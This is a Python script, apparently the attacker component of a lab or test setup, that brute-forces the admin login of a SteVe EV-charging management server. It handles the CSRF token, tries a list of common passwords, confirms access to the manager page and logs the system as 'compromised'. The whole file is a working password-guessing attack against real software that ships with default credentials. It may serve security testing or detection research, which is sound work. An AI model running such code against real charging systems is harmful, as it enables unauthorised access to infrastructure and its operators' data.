"""
CSMS Credential Brute-Force Attacker

Waits for SteVe to become available, then attempts to discover the
default admin credentials by submitting several incorrect passwords
before finally authenticating with the known default credentials.

Emits structured JSON logs distinguishing:
  - Failed login attempts
  - Credential discovery (successful login)
  - Verified access to an authenticated manager page

Environment variables:
  TARGET_URL     Base URL of the SteVe manager (default: http://app:8180/steve)
  USERNAME       The known admin username (default: admin)
  PASSWORD       The known admin password (default: 1234)
  WORDLIST       Comma-separated list of passwords to try (default: admin,password,1234,steve,changeme,root,test)
  LOGIN_DELAY_S  Seconds to wait between login attempts (default: 2)
"""

import json
import logging
import os
import sys
import time
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
)
logger = logging.getLogger("csms_attacker")

TARGET_URL = os.getenv("TARGET_URL", "http://app:8180/steve")
USERNAME = os.getenv("USERNAME", "admin")
PASSWORD = os.getenv("PASSWORD", "1234")
WORDLIST_RAW = os.getenv("WORDLIST", "admin,password,1234,steve,changeme,root,test")
LOGIN_DELAY_S = float(os.getenv("LOGIN_DELAY_S", "2"))

WORDLIST = [p.strip() for p in WORDLIST_RAW.split(",") if p.strip()]

def emit_log(level: str, event: str, detail: str, extra: dict = None) -> None:
    """Emit a structured JSON log line."""
    record = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "level": level,
        "event": event,
        "detail": detail,
    }
    if extra:
        record.update(extra)
    logger.info(json.dumps(record))


def _signin_url() -> str:
    return urljoin(TARGET_URL + "/", "manager/signin")


def _manager_url() -> str:
    return urljoin(TARGET_URL + "/", "manager")


def _extract_csrf_token(html: str) -> str:
    soup = BeautifulSoup(html, "html.parser")
    csrf_input = soup.find("input", {"name": "_csrf"})
    if csrf_input:
        return csrf_input.get("value", "")
    return ""


def attempt_login(password: str) -> tuple:
    """
    Attempt to log in with the given password.
    Returns (success, status_code, session, redirect_location).

    A JSESSIONID is not proof of authentication: Spring creates a session for
    the CSRF-protected sign-in form and failed logins are redirects too. Each
    candidate therefore gets an isolated session and is verified by requesting
    a protected page without following redirects.
    """
    session = requests.Session()
    try:
        signin_resp = session.get(_signin_url(), timeout=15)
        signin_resp.raise_for_status()
    except Exception as exc:
        emit_log("ERROR", "network_error", f"Failed to load sign-in page: {exc}")
        return False, 0, None, ""

    csrf_token = _extract_csrf_token(signin_resp.text)
    if not csrf_token:
        emit_log("ERROR", "csrf_missing", "Could not find CSRF token on sign-in page")
        return False, 0, None, ""

    try:
        login_resp = session.post(
            _signin_url(),
            data={
                "username": USERNAME,
                "password": password,
                "_csrf": csrf_token,
            },
            allow_redirects=False,
            timeout=15,
        )
    except Exception as exc:
        emit_log("ERROR", "network_error", f"Failed to submit login form: {exc}")
        return False, 0, None, ""

    location = login_resp.headers.get("Location", "")
    redirected_to_error = "signin?error" in location.lower()
    redirect_is_plausible = (
        login_resp.status_code in (302, 303)
        and not redirected_to_error
    )
    if not redirect_is_plausible:
        return False, login_resp.status_code, None, location

    try:
        verify_resp = session.get(_manager_url(), allow_redirects=False, timeout=15)
    except Exception as exc:
        emit_log("ERROR", "network_error", f"Failed to verify login: {exc}")
        return False, login_resp.status_code, None, location

    verify_location = verify_resp.headers.get("Location", "")
    authenticated = (
        verify_resp.status_code == 200
        and "signin" not in verify_location.lower()
        and (
            "Charge Points" in verify_resp.text
            or "chargepoints" in verify_resp.text.lower()
        )
    )
    return authenticated, login_resp.status_code, session if authenticated else None, location


def verify_authenticated_access(session: requests.Session) -> bool:
    """Verify we can access the authenticated manager overview page."""
    try:
        resp = session.get(_manager_url(), allow_redirects=False, timeout=15)
        resp.raise_for_status()
        # The manager page should contain the string "Charge Points" or similar
        return "Charge Points" in resp.text or "chargepoints" in resp.text.lower()
    except Exception as exc:
        emit_log("ERROR", "verify_failed", f"Could not access manager page: {exc}")
        return False


def main() -> None:
    emit_log("INFO", "attack_start", "CSMS credential brute-force attack starting", {
        "target": TARGET_URL,
        "username": USERNAME,
        "wordlist_size": len(WORDLIST),
        "delay_s": LOGIN_DELAY_S,
    })

    # Ensure the correct password is in the wordlist for deterministic success
    if PASSWORD not in WORDLIST:
        emit_log("WARN", "password_not_in_wordlist",
                 f"Correct password '{PASSWORD}' not in wordlist; appending it")
        WORDLIST.append(PASSWORD)

    discovered = False
    authenticated_session = None
    for idx, candidate in enumerate(WORDLIST, start=1):
        emit_log("INFO", "attempt", f"Login attempt {idx}/{len(WORDLIST)}", {
            "attempt": idx,
            "total": len(WORDLIST),
            "password_candidate": candidate,
        })

        success, status_code, candidate_session, location = attempt_login(candidate)

        if success:
            emit_log("SUCCESS", "credential_discovery",
                     f"Default credentials discovered: {USERNAME} / {candidate}", {
                         "username": USERNAME,
                         "password": candidate,
                         "attempt": idx,
                     })
            discovered = True
            authenticated_session = candidate_session
            break
        else:
            emit_log("FAIL", "failed_login",
                     f"Login failed with password '{candidate}' (HTTP {status_code})", {
                          "password_candidate": candidate,
                          "http_status": status_code,
                          "redirect_location": location,
                      })

        time.sleep(LOGIN_DELAY_S)

    if not discovered:
        emit_log("ERROR", "attack_failed",
                 "All password candidates exhausted without successful login")
        sys.exit(1)

    # Verify authenticated access to the manager page
    emit_log("INFO", "verifying_access", "Attempting to access authenticated manager page")
    if authenticated_session is not None and verify_authenticated_access(authenticated_session):
        emit_log("SUCCESS", "verified_access",
                 "Successfully accessed authenticated manager page — CSMS compromised", {
                     "url": _manager_url(),
                 })
    else:
        emit_log("ERROR", "verify_failed",
                  "Login succeeded but could not verify manager page access")
        sys.exit(1)

    emit_log("INFO", "attack_complete", "CSMS credential brute-force attack completed")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        emit_log("INFO", "interrupted", "Attack interrupted by user")
        sys.exit(0)
